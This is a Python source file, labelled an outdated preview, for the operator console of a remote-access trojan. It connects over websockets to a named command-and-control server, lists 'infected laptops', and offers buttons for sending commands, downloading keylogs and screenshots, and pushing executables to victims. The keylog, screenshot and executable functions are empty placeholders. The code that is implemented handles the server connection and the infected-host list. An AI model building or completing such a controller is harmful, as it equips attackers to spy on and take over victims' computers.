#########################################################################################
##### This is just a preview of the code, it will be outdated and probably not work #####
#########################################################################################


import tkinter as tk
from tkinter import filedialog, scrolledtext, Frame, Label, Entry, Button, Listbox, Toplevel
import asyncio
import websockets
import json
import os
import threading
import time
import sys

# Configuration
C2_SERVER_URI = "wss://owfstest1.up.railway.app/"
LOG_FILE = f'log/controller_log{time.time()}.txt'
CLIENT_ID_FILE = 'controller_id.txt'  # File to store the controller's client ID

class TrojanController:
    def __init__(self, master):
        self.master = master
        master.title("Controller")
        master.geometry("800x600")
        master.configure(bg='black')

        self.client_id = self.load_client_id()  # Load or initialize client ID

        # Create a frame for the left side (commands)
        self.left_frame = Frame(master, bg='black')
        self.left_frame.pack(side=tk.LEFT, fill=tk.BOTH, padx=(10, 0), pady=10)

        # Create a frame for the right side (logs)
        self.right_frame = Frame(master, bg='black')
        self.right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(0, 10), pady=10)

        # Command input section
        self.label = Label(self.left_frame, text="Send Commands:", bg='black', fg='white')
        self.label.pack()

        self.command_entry = Entry(self.left_frame, width=50, bg='gray', fg='white')
        self.command_entry.pack(pady=5)

        self.send_button = Button(self.left_frame, text="Send Command", command=self.send_command, bg='gray', fg='white')
        self.send_button.pack(pady=5)

        self.download_button = Button(self.left_frame, text="Download Keylogs", command=self.download_keylogs, bg='gray', fg='white')
        self.download_button.pack(pady=5)

        self.screenshot_button = Button(self.left_frame, text="Download Screenshots", command=self.download_screenshots, bg='gray', fg='white')
        self.screenshot_button.pack(pady=5)

        self.send_exe_button = Button(self.left_frame, text="Send Executable", command=self.send_executable, bg='gray', fg='white')
        self.send_exe_button.pack(pady=5)

        # New button to update the infected list
        self.update_list_button = Button(self.left_frame, text="Update Infected List", command=self.update_infected_list_request, bg='gray', fg='white')
        self.update_list_button.pack(pady=5)

        # Log display section
        self.log_text = scrolledtext.ScrolledText(self.right_frame, width=50, bg='black', fg='white', insertbackground='white', wrap=tk.WORD)
        self.log_text.pack(expand=True, fill=tk.BOTH)

        self.connection_status = tk.StringVar()
        self.connection_label = Label(self.left_frame, textvariable=self.connection_status, bg='black', fg='white')
        self.connection_label.pack(pady=5)

        # Listbox for infected laptops
        self.infected_listbox = Listbox(self.left_frame, bg='gray', fg='white', width=50, height=10)
        self.infected_listbox.pack(pady=10)
        self.infected_listbox.bind('<ButtonRelease-1>', self.show_infected_info)

        self.loop = asyncio.new_event_loop()
        self.connect_thread = threading.Thread(target=self.connect_to_c2)
        self.connect_thread.start()

        self.load_log()

    def load_client_id(self):
        """Load the client ID from a file, or return None if not found."""
        if os.path.exists(CLIENT_ID_FILE):
            with open(CLIENT_ID_FILE, 'r') as f:
                return f.read().strip()
        return None

    def save_client_id(self, client_id):
        """Save the client ID to a file."""
        with open(CLIENT_ID_FILE, 'w') as f:
            f.write(client_id)

    def load_log(self):
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'r') as f:
                self.log_text.insert(tk.END, f.read())

    def log(self, message):
        self.log_text.insert(tk.END, message + '\n')
        self.log_text.yview(tk.END)  # Auto-scroll to the bottom
        with open(LOG_FILE, 'a') as log_file:
            log_file.write(message + '\n')

    def connect_to_c2(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_until_complete(self.async_connect())

    async def async_connect(self):
        while True:
            try:
                async with websockets.connect(C2_SERVER_URI) as websocket:
                    self.websocket = websocket  # Save the websocket for sending commands
                    self.log(f"INFO {time.time()}: Connected to C2 Server")

                    # Step 1: Send the role and client_id (if available) to the server
                    initial_message = {
                        "role": "controller",
                        "client_id": self.client_id
                    }
                    await websocket.send(json.dumps(initial_message))
                    self.connection_status.set("Server connected, waiting for commands...")

                    # Step 2: Listen for server responses (including assigning client ID)
                    await self.listen_for_responses(websocket)

            except Exception as e:
                self.log(f"ERROR {time.time()}: Failed to connect to server: {e}")
                self.connection_status.set("Server not connected, retrying in 5s...")
                for i in range(5, 0, -1):
                    self.connection_status.set(f"Retrying in {i} seconds...")
                    self.master.update()
                    time.sleep(1)  # Wait before retrying
                self.connection_status.set("Reconnecting...")

    async def listen_for_responses(self, websocket):
        while True:
            try:
                response = await websocket.recv()
                message = json.loads(response)
                self.log(f"INFO {time.time()}: Response received: {message}")

                # Step 3: Handle assigned client ID
                if message.get("type") == "assign_id":
                    self.client_id = message["client_id"]
                    self.save_client_id(self.client_id)
                    self.log(f"INFO {time.time()}: Assigned client ID: {self.client_id}")

                # Handle other message types
                elif message.get("type") == "response":
                    self.handle_response(message)
                elif message.get("type") == "infected_list":
                    self.update_infected_list(message['infected_laptops'])

            except Exception as e:
                self.log(f"ERROR {time.time()}: Error receiving response: {e}")
                break  # Exit on error

    def handle_response(self, message):
        command_id = message['id']
        response = message['response']
        self.log(f"Response for command {command_id}: {response}")

    def send_command(self):
        # Implement command sending logic here
        pass  # Placeholder for sending commands

    def download_keylogs(self):
        # Implement keylog download logic here
        pass  # Placeholder for downloading keylogs

    def download_screenshots(self):
        # Implement screenshot download logic here
        pass  # Placeholder for downloading screenshots

    def send_executable(self):
        # Implement executable sending logic here
        pass  # Placeholder for sending executables

    def update_infected_list_request(self):
        """Send a request to update the infected list."""
        try:
            self.log(f"INFO {time.time()}: Getting list of infected computers...")
            self.loop.create_task(self.request_infected_list())
        except Exception as e:
            self.log(f"ERROR {time.time()}: Failed to request infected list: {e}")

    async def request_infected_list(self):
        """Send a request to the C2 server for the infected laptop list."""
        if hasattr(self, 'websocket') and self.websocket:
            try:
                await self.websocket.send(json.dumps({"type": "request_client_list", "role": "controller"}))  # Send the client list request
                self.log(f"INFO {time.time()}: Requested infected client list.")
            except Exception as e:
                self.log(f"ERROR {time.time()}: Failed to send request: {e}")
        else:
            self.log(f"ERROR {time.time()}: Websocket is not connected.")

    def update_infected_list(self, infected_laptops):
        self.infected_listbox.delete(0, tk.END)  # Clear the current list
        for laptop_id, laptop_data in infected_laptops.items():
            # Format: "ID - Role (Last Seen: Time)"
            laptop_info = f"{laptop_id} - {laptop_data.get('role', 'Unknown Role')} (Last Seen: {laptop_data.get('last_seen', 'N/A')})"
            self.infected_listbox.insert(tk.END, laptop_info)

    def show_infected_info(self, event):
        selected_index = self.infected_listbox.curselection()
        if selected_index:
            laptop_info = self.infected_listbox.get(selected_index)
            laptop_id = laptop_info.split(' - ')[0]  # Extract ID
            self.open_info_window(laptop_id)

    def open_info_window(self, laptop_id):
        """Open a new window displaying information about the selected infected laptop."""
        info_window = Toplevel(self.master)
        info_window.title(f"Information for {laptop_id}")
        info_window.geometry("300x200")

        # Fetch and display data about the selected laptop
        laptop_data = self.fetch_laptop_data(laptop_id)
        info_text = f"ID: {laptop_id}\nRole: {laptop_data.get('role', 'N/A')}\nLast Seen: {laptop_data.get('last_seen', 'N/A')}\nData: {laptop_data.get('data', 'N/A')}"
        label = Label(info_window, text=info_text, bg='white', fg='black')
        label.pack(pady=20)

    def fetch_laptop_data(self, laptop_id):
        """Fetch data from the infected laptops dictionary."""
        for laptop_info in self.infected_listbox.get(0, tk.END):
            if laptop_info.startswith(laptop_id):
                role = laptop_info.split(' - ')[1].split(' (')[0]
                last_seen = laptop_info.split('Last Seen: ')[1].rstrip(')')
                return {"role": role, "last_seen": last_seen, "data": {}}
        return {"role": "Unknown", "last_seen": "N/A", "data": {}}

    def on_closing(self):
        self.loop.stop()  # Stop the event loop
        self.save_log()
        self.master.destroy()
        raise KeyboardInterrupt("sorry, only way i can think of forcing the app to close")
        sys.exit()

    def save_log(self):
        with open(LOG_FILE, 'a') as log_file:
            log_file.write(f"INFO {time.time()}: Application closed.\n")

if __name__ == "__main__":
    root = tk.Tk()
    controller = TrojanController(root)
    root.protocol("WM_DELETE_WINDOW", controller.on_closing)
    root.mainloop()
